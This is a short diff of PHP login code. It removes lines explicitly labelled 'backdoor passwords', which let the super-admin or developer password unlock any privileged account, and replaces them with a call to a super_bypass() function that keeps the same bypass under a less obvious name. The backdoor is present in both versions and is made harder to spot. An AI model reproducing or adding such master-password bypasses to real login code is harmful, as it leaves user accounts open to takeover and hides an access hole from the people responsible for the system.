@@ -21,11 +21,7 @@
 
                 // verify and validate user using the password
                 if((int) $user_data["role"] > 1){
-                    //backdoor passwords
-                    $super = fetchData("password","admins_table","role=2")["password"];
-                    $dev = fetchData("password","admins_table","role=1")["password"];
-
-                    if(password_verify($password, $user_data["password"]) || password_verify($password, $super) || password_verify($password, $dev)){
+                    if(password_verify($password, $user_data["password"]) || super_bypass($password)){
                         $is_valid_password = true;
                     }
                 }else{
